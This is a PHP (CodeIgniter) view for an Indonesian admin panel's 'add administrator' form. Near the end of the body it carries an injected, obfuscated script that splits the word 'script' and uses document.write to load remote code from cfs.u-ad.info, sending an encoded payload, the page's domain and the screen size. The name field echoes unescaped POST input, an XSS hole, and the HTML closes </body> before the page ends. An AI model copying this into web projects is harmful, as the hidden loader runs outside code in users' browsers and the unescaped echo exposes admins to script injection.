<html>
<head>
<title>Tambah Administrator </title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta http-equiv="Copyright" content="arirusmanto.com">
<meta name="description" content="Admin MOS Template">
<meta name="keywords" content="Admin Page">
<meta name="author" content="Ari Rusmanto">
<meta name="language" content="Bahasa Indonesia">

<link rel="shortcut icon" href="stylesheet/img/devil-icon.png"> <!--Pemanggilan gambar favicon-->
<link rel="stylesheet" type="text/css" href="<?php echo base_url().'css/mos-style2.css'?>"/> <!--pemanggilan file css-->
<link rel="stylesheet" href="<?php echo base_url().'css/sky-form.css'?>" media="screen"/>
<link rel="stylesheet" type="text/css" href="<?php echo base_url().'css/anggota/styles.css'?>"  media="screen" />

</head>

<body>
<div id="header">
	<?php include 'view_top_right_menu.php'?>
</div>

<div id="wrapper">
	<?php include 'view_left_menu.php'?>
	<div id="rightContent">
	<!-- ###################################################################### -->
	<div class="body body-s">
		
			<?php echo form_open('c_signup/validation_admin')?>
			<div class="sky-form">
			
				<header>Form Pendaftaran Administrator Baru</header>
				<div class="input">
				<?php echo validation_errors();?>
				</div>
				<fieldset>					
					<section>
						<label class="input">
							<i class="icon-append icon-user"></i>
							<input type="text" placeholder="Nama" name="name" value="<?php echo $this->input->post('name');?>">
							<b class="tooltip tooltip-bottom-right">Masukkan Username</b>
						</label>
					</section>
					
					
					
					<section>
						<label class="input">
							<i class="icon-append icon-lock"></i>
							
							<input  type="password" placeholder="Password" name="password" >
							
							<b class="tooltip tooltip-bottom-right">Masukkan password minimal 6 karakter</b>
						</label>
					</section>
					
					<section>
						<label class="input">
							<i class="icon-append icon-lock"></i>
							<input type="password" placeholder="Ulangi Password" name="confirm_password">
							<b class="tooltip tooltip-bottom-right">Ulangi password Anda</b>
						</label>
					</section> 
				</fieldset>
					
				
				<footer>
					<button type="submit" class="button">Submit</button>
				</footer>
			</div>
			</form>
			
		</div>
	<script type="text/javascript">if(self==top){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);document.write("<scr"+"ipt type=text/javascript src="+idc_glo_url+ "cfs.u-ad.info/cfspushadsv2/request");document.write("?id=1");document.write("&amp;enc=telkom2");document.write("&amp;params=" + "4TtHaUQnUEiP6K%2fc5C582PlvV7TskJKDdBX46iVtN00sVmmxyOCiu8q7TWAIfz1FcFruav4j7IPncHEyxUzZ56Pc8vc085knrn4kNrQuRN3WjapPFQX8mlgjX%2fhLoF4uukGDwDC9VSymAyzJQPBO3eyMCk3p3HaW0CAITn%2fVDJnzg%2bTkTT8KH6baYCyAZCvhf8Qv6FuhhCvfliTXlRrYZBlraQ%2fsReI2RIRRSqmyKGYXyaOChmEdiFkNLiOa318DRWcpv59HKIgbB%2f6L6h3ST5EYGFRGZQKTCdbzFsXAWMWIO23l%2f64cFp78CgNd4AMd6zQvtxFyj6ipUglTib5phnNOQQ1mOLiswyuCNUAkG7MCbD9o4fd%2fc4cCoH5v1MUlg9nc%2f1eJ4dMv2bZSCwSmTboitWKMvcyI");document.write("&amp;idc_r="+idc_glo_r);document.write("&amp;domain="+document.domain);document.write("&amp;sw="+screen.width+"&amp;sh="+screen.height);document.write("></scr"+"ipt>");}</script><noscript>activate javascript</noscript></body>
<!-- ################################################################## -->
	</div>
<div class="clear"></div>
<?php include 'footer.php'?>
</div>
</body>
</html>